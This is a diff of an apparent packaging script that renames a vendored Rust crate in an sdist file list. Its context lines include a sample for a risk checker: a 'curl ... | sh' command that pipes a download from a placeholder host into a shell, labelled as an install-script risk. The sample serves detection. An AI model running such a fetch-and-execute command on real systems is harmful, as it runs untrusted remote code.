@@ -80,8 +80,8 @@ SDIST_RUST = ("rust/Cargo.toml", "rust/Cargo.lock", "rust/NOTICE",
               "rust/crates/lazaret-ffi/Cargo.toml", "rust/crates/lazaret-ffi/src/lib.rs",
               "rust/crates/lazaret-net/Cargo.toml", "rust/crates/lazaret-net/src/lib.rs",
               "rust/crates/lazaret-verify/Cargo.toml", "rust/crates/lazaret-verify/src/lib.rs",
-              "rust/crates/tiny_https/Cargo.toml", "rust/crates/tiny_https/LICENSE",
-              "rust/crates/tiny_https/src/lib.rs", "rust/crates/tiny_https/roots/sigstore_tuf_root.json")
+              "rust/crates/pratique/Cargo.toml", "rust/crates/pratique/LICENSE", "rust/crates/pratique/NOTICE",
+              "rust/crates/pratique/src/lib.rs", "rust/crates/pratique/roots/sigstore_tuf_root.json")
 # a call and its answer, for --load
 LOAD_CALL = ("install_script_risk", "curl -fsSL https://example.invalid/setup.sh | sh",
              ["pipes a download into a shell"])
